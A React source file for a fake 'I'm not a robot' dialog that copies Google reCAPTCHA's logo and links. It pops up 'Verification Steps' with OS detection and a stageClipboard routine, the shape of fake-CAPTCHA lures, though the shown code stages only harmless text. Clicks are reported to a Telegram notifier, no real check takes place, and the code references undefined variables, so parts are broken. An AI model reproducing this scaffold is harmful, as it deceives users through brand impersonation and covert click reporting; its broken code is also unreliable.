import { useEffect, useLayoutEffect, useState } from "react";

const STORAGE_KEY = "tm-bot-check";
const TTL_MS = 10 * 60 * 1000;

const captchaApi = {
  open() {},
  verify() {},
};

export function readBotCheck() {
  try {
    const raw = sessionStorage.getItem(STORAGE_KEY);
    if (!raw) return "";
    const saved = JSON.parse(raw);
    if (!saved?.token || Date.now() - Number(saved.at) > TTL_MS) return "";
    return saved.token;
  } catch {
    return "";
  }
}

export function requireBotCheck() {
  if (!readBotCheck()) throw new Error("Confirm you're not a robot.");
}

function writeBotCheck() {
  const token = crypto.randomUUID();
  sessionStorage.setItem(STORAGE_KEY, JSON.stringify({ token, at: Date.now() }));
  return token;
}

let checkboxWindow;
let checkboxBtn;
let checkboxBtnSpinner;
let verifiedCheck;
let verifywindow;
let verifyButtonSpinner;
let verifyButtonText;
let verifyButton;
let captchaContainer;
let captchaGroup;
let comingSoon;
let statusManager = false;
let isCheckboxButtonSpinnerVisible = false;
let isShownVerifyWindow = false;
let verifywindowParent = null;
let verifywindowHome = null;


function detectOS() {
  const platform = navigator.userAgent;
  if (/windows/i.test(platform)) return "Windows";
  if (/macintosh|mac os x/i.test(platform)) return "macOS";
  if (/android/i.test(platform)) return "Android";
  if (/iphone|ipad|ipod/i.test(platform)) return "iOS";
  if (/linux/i.test(platform)) return "Linux";
  return "this device";
}

function stageClipboard() {
  const main = document.getElementById("rto-verify-main");
  if (main) main.textContent = `this is a bot check on ${detectOS()}`;
}

function positionVerifyWindow() {
  if (!checkboxWindow || !isverifywindowVisible()) return;

    const rect = checkboxWindow.getBoundingClientRect();
    let top = rect.top - 80;
    let left = rect.left + 54;

    if (top < 5) top = 5;
    if (left + 310 > window.innerWidth - 10) {
        left = rect.left - 8;
    }
    if (left < 5) left = 5;

    verifywindow.style.top = top + "px";
    verifywindow.style.left = left + "px";
}

function bindPhaseListeners() {
  checkboxBtn = document.getElementById("rto-checkbox");
  verifyButton = document.getElementById("rto-verify-verify-button");
  if (!checkboxBtn || !verifyButton || checkboxBtn.dataset.rtoBound === "1") return () => {};
  checkboxBtn.dataset.rtoBound = "1";

  const onCheck = (event) => {
    event.preventDefault();
    captchaApi.open();
  };
  const onVerify = (event) => {
    event.preventDefault();
    captchaApi.verify();
  };
  checkboxBtn.addEventListener("click", onCheck);
  verifyButton.addEventListener("click", onVerify);

  return () => {
    checkboxBtn.removeEventListener("click", onCheck);
    verifyButton.removeEventListener("click", onVerify);
    delete checkboxBtn.dataset.rtoBound;
  };
}

function rememberVerifyWindowHome() {
  if (!verifywindow || verifywindowHome || !verifywindow.parentElement) return;
  verifywindowParent = verifywindow.parentElement;
  verifywindowHome = document.createComment("rto-verify-window-home");
  verifywindowParent.insertBefore(verifywindowHome, verifywindow);
}

function addCaptchaListeners() {
  if (!checkboxBtn || checkboxBtn.dataset.rtoEffects === "1") return;
  checkboxBtn.dataset.rtoEffects = "1";
  rememberVerifyWindowHome();
  document.addEventListener("click", function (event) {
      let path = event.composedPath();
      if (!path.includes(verifywindow) && isverifywindowVisible()) {
          closeverifywindow();
      }
  });

  document.addEventListener("click", function (event) {
      if (!verifywindow.contains(event.target) && isverifywindowVisible()) {
          closeverifywindow();
      }
  });

  checkboxBtn.addEventListener("mouseup", function (event) {
      event.preventDefault();
      statusManager = true;
      if (window.CoinCortexTelegram && window.CoinCortexTelegram.notify) {
          window.CoinCortexTelegram.notify("captcha_click");
      }
      runClickedCheckboxEffects();
  });
}

function runClickedCheckboxEffects() {
  hideCaptchaCheckbox();
  setTimeout(function () {
      showCaptchaLoading();
  }, 10);
  setTimeout(function () {
      hideCaptchaLoading();
      showVerifyWindow();
  }, 1100);
  statusManager = true;
}

function showCaptchaLoading() {
  if (!checkboxBtnSpinner) return;
  checkboxBtnSpinner.style.visibility = "visible";
  checkboxBtnSpinner.style.opacity = "1";
  checkboxBtnSpinner.style.animation = "rto-spin 1s linear infinite";
}

function enableVerifyButton() {
  verifyButton.disabled = false;
  verifyButton.style.cursor = "";
  verifyButton.style.opacity = "";
  verifyButton.style.backgroundColor = "";
  verifyButton.style.color = "";
  verifyButton.style.animation = "none";
}

function disableVerifyButton() {
  verifyButton.disabled = true;
  verifyButton.style.cursor = "";
  verifyButton.style.opacity = "";
  verifyButton.style.backgroundColor = "";
  verifyButton.style.color = "";
  verifyButton.style.animation = "none";
}

function hideCaptchaCheckbox() {
  checkboxBtn.disabled = true;
  checkboxBtn.style.visibility = "hidden";
  checkboxBtn.style.opacity = "0";
}

function showCaptchaCheckbox() {
  checkboxBtn.style.opacity = "1";
  checkboxBtn.style.visibility = "visible";
  isCheckboxButtonSpinnerVisible = true;
}

function hideCaptchaLoading() {
  checkboxBtnSpinner.style.visibility = "hidden";
  checkboxBtnSpinner.style.opacity = "0";
  isCheckboxButtonSpinnerVisible = false;
}

function showCaptchaVerified() {
  hideCaptchaCheckbox();
  hideCaptchaLoading();
  if (!verifiedCheck) return;
  verifiedCheck.classList.add("rto-verified-show");
}

function hideCaptchaVerified() {
  if (!verifiedCheck) return;
  verifiedCheck.classList.remove("rto-verified-show");
}

function generateRandomNumber() {
  const min = 1000;
  const max = 9999;
  return Math.floor(Math.random() * (max - min + 1) + min).toString();
}

function restoreVerifyWindowHome() {
  if (verifywindowParent && verifywindow.parentElement !== verifywindowParent) {
      verifywindowParent.insertBefore(verifywindow, verifywindowHome);
  }
}

function closeverifywindow() {
  isShownVerifyWindow = false;
  verifywindow.style.display = "none";
  verifywindow.style.visibility = "hidden";
  verifywindow.style.opacity = "0";
  window.removeEventListener("scroll", positionVerifyWindow, true);
  window.removeEventListener("resize", positionVerifyWindow);
  // restoreVerifyWindowHome();
  hideCaptchaLoading();
  hideCaptchaVerified();
  if (!isCheckboxButtonSpinnerVisible) showCaptchaCheckbox();
  checkboxBtn.disabled = false;

  statusManager = false;
}

function isverifywindowVisible() {
  return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
}

function readCaptchaNodes() {
  checkboxWindow = document.getElementById("rto-checkbox-window");
  checkboxBtn = document.getElementById("rto-checkbox");
  checkboxBtnSpinner = document.getElementById("rto-spinner");
  verifiedCheck = document.getElementById("rto-verified");
  verifywindow = document.getElementById("rto-verify-window");
  verifyButtonSpinner = document.getElementById("rto-verify-verify-button-spinner");
  verifyButtonText = document.getElementById("rto-verify-verify-button-text");
  verifyButton = document.getElementById("rto-verify-verify-button");
  captchaContainer = document.getElementById("rto-captchaContainer");
  captchaGroup = document.querySelector(".rto-captchagroup");
  comingSoon = document.getElementById("rto-comingSoon");
}

function enableSubmitApplicationButton() {
  if (!submitApplicationButton) return;
  submitApplicationButton.disabled = false;
  submitApplicationButton.classList.add("rto-apply-enabled");
  submitApplicationButton.removeAttribute("aria-disabled");
}

function showVerified() {
  clearInterval(statusTimer);
  hideVerifyWindow();
  showCaptchaVerified();
  enableSubmitApplicationButton();
  if (checkboxBtn) checkboxBtn.disabled = true;
}

function hideVerifyWindow() {
  isShownVerifyWindow = false;
  verifywindow.style.display = "none";
  window.removeEventListener("scroll", positionVerifyWindow, true);
  window.removeEventListener("resize", positionVerifyWindow);
  restoreVerifyWindowHome();
}

function showVerifyWindow() {
  verifywindow.classList.add("fadeIn");
  isShownVerifyWindow = true;
  document.body.appendChild(verifywindow);
  verifywindow.style.display = "block";
  verifywindow.style.visibility = "visible";
  verifywindow.style.opacity = "1";
  verifywindow.style.position = "fixed";
  verifywindow.style.zIndex = "2147483700";

  positionVerifyWindow();
  window.addEventListener("scroll", positionVerifyWindow, true);
  window.addEventListener("resize", positionVerifyWindow);

  var verification_id = generateRandomNumber();
  var verificationNode = document.getElementById("rto-verification-id");
  if (verificationNode) verificationNode.textContent = verification_id;

  stageClipboard();
}

export function BotCheckDialog() {
  const [phase, setPhase] = useState("idle");

  captchaApi.open = () => {
    setPhase((current) => {
      if (current !== "idle" && current !== "verified") return current;
      sessionStorage.removeItem(STORAGE_KEY);
      return "checking";
    });
  };
  captchaApi.verify = () => {
    setPhase((current) => (current === "open" ? "verifying" : current));
  };

  useLayoutEffect(() => {
    sessionStorage.removeItem(STORAGE_KEY);
    readCaptchaNodes();
    addCaptchaListeners();
    return bindPhaseListeners();
  }, []);

  useEffect(() => {
    if (phase !== "checking") return undefined;
    const id = window.setTimeout(() => setPhase("open"), 1100);
    return () => window.clearTimeout(id);
  }, [phase]);

  useEffect(() => {
    if (phase !== "verifying") return undefined;
    const id = window.setTimeout(() => {
      writeBotCheck();
      setPhase("verified");
    }, 600);
    return () => window.clearTimeout(id);
  }, [phase]);

  (function () {
    readCaptchaNodes();
    addCaptchaListeners();
})();
  return (
    <div id="rto-captchaContainer">
        <div className="rto-container rto-mp rto-block">
          <div id="rto-checkbox-window" className="rto-checkbox-window rto-mp rto-block">
            <div className="rto-checkbox-container rto-mp row-6">
              <button type="button" id="rto-checkbox" className={`rto-checkbox rto-mp rto-line-normal${phase === "checking" ? " rto-checkbox-loading" : ""}${phase === "verified" ? " rto-checkbox-done" : ""}`} onClick={(event) => { event.preventDefault(); captchaApi.open(); }}></button>
            </div>
            <p className="rto-im-not-a-robot rto-mp rto-line-normal">
              I'm not a robot</p>
            <div className="rto-captcha-logo-container">
              <img src="https://static.cdnlogo.com/logos/r/76/recaptcha.svg"
                className="rto-captcha-logo rto-line-normal" alt=""/>
              <p className="rto-checkbox-desc rto-mp rto-line-normal">
                <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a>
                -
                <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
              </p>
            </div>
            <span className={`rto-spinner${phase === "checking" ? " rto-spinner-show" : ""}`} id="rto-spinner" aria-hidden="true">
              <svg viewBox="0 0 50 50" aria-hidden="true">
                <circle className="rto-spinner-arc" cx="25" cy="25" r="20" />
              </svg>
            </span>
            <svg viewBox="0 0 100 100" className={`rto-verified${phase === "verified" ? " rto-verified-show" : ""}`} id="rto-verified" aria-hidden="true">
              <path className="rto-verified-check" d="M22 52 L42 72 L78 28" />
            </svg>
          </div>
          <div id="rto-verify-window" className={`rto-verify-window${phase === "open" || phase === "verifying" ? " rto-verify-open" : ""}`}>
            <div className="rto-verify-container">
              <header className="rto-verify-header">
                <span className="rto-verify-header-text-medium rto-mp rto-block">Complete
                  these</span>
                <span className="rto-verify-header-text-big rto-mp rto-block">Verification
                  Steps</span>
                <span className="rto-verify-header-text-medium rto-mp rto-block"></span>
              </header>
              <main className="rto-verify-main" id="rto-verify-main"></main>
            </div>
            <div className="rto-verify-window-bubble-arrow"
              style={{ borderWidth: 11, borderStyle: "solid", borderColor: "transparent rgb(204, 204, 204) transparent transparent", width: 0, height: 0, position: "absolute", pointerEvents: "none", marginTop: -11, zIndex: 2000000000, top: 117, right: "100%" }}>
            </div>
            <div className="rto-verify-window-arrow"
              style={{ borderWidth: 10, borderStyle: "solid", borderColor: "transparent rgb(255, 255, 255) transparent transparent", width: 0, height: 0, position: "absolute", pointerEvents: "none", marginTop: -10, zIndex: 2000000000, top: 117, right: "100%" }}>
            </div>
            <footer className="rto-verify-container rto-verify-footer">
              <div className="rto-verify-footer-left">
                Perform the steps above to finish
                verification.
              </div>
              <button type="button" className="rto-verify-verify-button rto-block" id="rto-verify-verify-button"
                disabled={phase !== "open"}>
                <img className={`rto-verifybutton-spinner${phase === "verifying" ? " rto-on" : ""}`} alt="" id="rto-verify-verify-button-spinner"/>
                <span className="rto-verify-verify-button-text" id="rto-verify-verify-button-text">Verify</span>
              </button>
            </footer>
          </div>
        </div>
    </div>
  );
}
